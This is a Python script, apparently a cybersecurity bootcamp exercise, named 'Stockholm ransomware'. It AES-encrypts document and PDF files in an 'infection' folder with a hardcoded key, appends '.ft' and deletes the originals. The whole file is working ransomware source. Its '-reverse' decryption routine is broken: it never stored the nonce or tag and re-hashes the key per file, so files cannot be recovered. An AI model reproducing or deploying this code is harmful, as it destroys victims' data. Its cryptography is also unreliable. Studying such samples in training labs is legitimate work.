__author__ = "abelrodr"
__date__ = "2023/05/17 11:23:29"
__copyright__ = "Copyright 2023, Cybersec Bootcamp Malaga"
__credits__ = ["abelrodr"]
__email__ = "abelrodr42malaga@gmail.com"

print('''\033[1;31m
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@%%%%%%%%%%%%%%%%%%%%%%%%%%%%%@@@@@
@%%%%%%%%%%%%%%%%%%@.@%%%%%%%%%%%%%%%%%%
@%%%%%%%@%%%%%@%@.......@%&%%%%%@%%%%%%%
@%%%%%%%%@...%@.%%@...@%%@*%*..@%%%%%%%%
@%%%%%%%%%%@...@....@....%...@%%%%%%%%%%
@%%%%%%%%%%%@..,.........%@.@%%%%%%%%%%%
@%%%%%%%%%(......@@...@@@@.@...%%%%%%%%%
@%%%%%%%%@...@..@..@...#%..@....%%%%%%%%
@%%%%%%%%@.................@...@%%%%%%%%
@@%%%%%%%%%...@....@@@...%@@..%%%%%%%%%%
@@%%%%%%%%%%%.@...........@.&%%%%%%%%%%@
@@@%%%%%%%%.*..@.........@@...@%%%%%%%@@
@@@&%%%%%%%%@.@...@...@@..@.@%%%%%%%%%@@
@@@@@%%%%%%%%%%...........@%%%%%%%%%@@@@
@@@@@@%%%%%%%%.............@%%%%%%%@@@@@
@@@@@@@@@%%%%%%%%%%%%%%%%%%%%%%%&@@@@@@@
@@@@@@@@@@@@%%%%%%%%%%%%%%%%%&@@@@@@@@@@
@@@@@@@@@@@@@@@@%%%%%%%%%&@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%@@@@@@@@@@@@@@@@@@@
    
''')

import os
import argparse
import hashlib
from Crypto.Cipher import AES

# Define las extensiones afectadas por Wannacry
WANNACRY_EXTENSIONS = ['.doc', '.xls', '.ppt', '.docx', '.xlsx', '.pptx', '.pdf']

# Define la clave de cifrado
KEY = 'clave_de_cifrado_123'

# Define la longitud de la clave
KEY_LENGTH = 16

# Define la función para cifrar un archivo
def cifrar_archivo(nombre_archivo):
    # Verifica que el archivo tenga una extensión afectada por Wannacry
    _, extension = os.path.splitext(nombre_archivo)
    if extension not in WANNACRY_EXTENSIONS:
        return

    # Verifica que el archivo no tenga ya la extensión ".ft"
    if nombre_archivo.endswith('.ft'):
        return

    # Genera un nuevo nombre de archivo con la extensión ".ft"
    nuevo_nombre = nombre_archivo + '.ft'

    # Cifra el archivo
    with open(nombre_archivo, 'rb') as archivo_origen:
        with open(nuevo_nombre, 'wb') as archivo_destino:
            # Lee el contenido del archivo
            contenido = archivo_origen.read()

            # Genera una clave a partir de la clave maestra
            clave = hashlib.sha256(KEY.encode('utf-8')).digest()[:KEY_LENGTH]

            # Cifra el contenido del archivo
            cipher = AES.new(clave, AES.MODE_EAX)
            ciphertext, tag = cipher.encrypt_and_digest(contenido)

            # Escribe el contenido cifrado en el archivo de destino
            archivo_destino.write(ciphertext)

            # Muestra el nombre del archivo cifrado
            print(f'Cifrando {nombre_archivo}')

    # Borra el archivo original
    os.remove(nombre_archivo)

# Define la función para revertir la infección
def revertir_infeccion(clave):
    # Busca los archivos con la extensión ".ft"
    archivos = [nombre_archivo for nombre_archivo in os.listdir('infection') if nombre_archivo.endswith('.ft')]

    # Descifra los archivos
    for nombre_archivo in archivos:
        with open(os.path.join('infection', nombre_archivo), 'rb') as archivo_origen:
            with open(os.path.join('infection', nombre_archivo[:-3]), 'wb') as archivo_destino:
                # Lee el contenido cifrado del archivo
                contenido_cifrado = archivo_origen.read()

                # Genera una clave a partir de la clave maestra
                clave = hashlib.sha256(clave.encode('utf-8')).digest()[:KEY_LENGTH]

                # Descifra el contenido del archivo
                cipher = AES.new(clave, AES.MODE_EAX, nonce=contenido_cifrado[:16])
                contenido = cipher.decrypt_and_verify(contenido_cifrado[16:], contenido_cifrado[16:])

                # Escribe el contenido descifrado en el archivo de destino
                archivo_destino.write(contenido)

                # Muestra el nombre del archivo descifrado
                print(f'Descifrando {nombre_archivo}')

        # Borra el archivo cifrado
        os.remove(os.path.join('infection', nombre_archivo))

# Define la función principal
def main():
    # Parsea los argumentos de línea de comando
    parser = argparse.ArgumentParser(description='Stockholm ransomware')
    parser.add_argument('-help', '-h', action='store_true', help='Mostrar ayuda')
    parser.add_argument('-version', '-v', action='store_true', help='Mostrar versión')
    parser.add_argument('-reverse', '-r', metavar='clave', help='Revertir la infección')
    parser.add_argument('-silent', '-s', action='store_true', help='No mostrar output')
    args = parser.parse_args()

    # Muestra la ayuda si se indica la opción -help
    if args.help:
        parser.print_help()
        return

    # Muestra la versión si se indica la opción -version
    if args.version:
        print('Stockholm ransomware v1.0')
        return

    # Revierte la infección si se indica la opción -reverse
    if args.reverse:
        revertir_infeccion(args.reverse)
        return

    # Cifra los archivos de la carpeta "infection"
    for nombre_archivo in os.listdir('infection'):
        cifrar_archivo(os.path.join('infection', nombre_archivo))

    # Muestra un mensaje final si no se indica la opción -silent
    if not args.silent:
        print('La infección ha sido completada')

# Llama a la función principal
if __name__ == '__main__':
    main()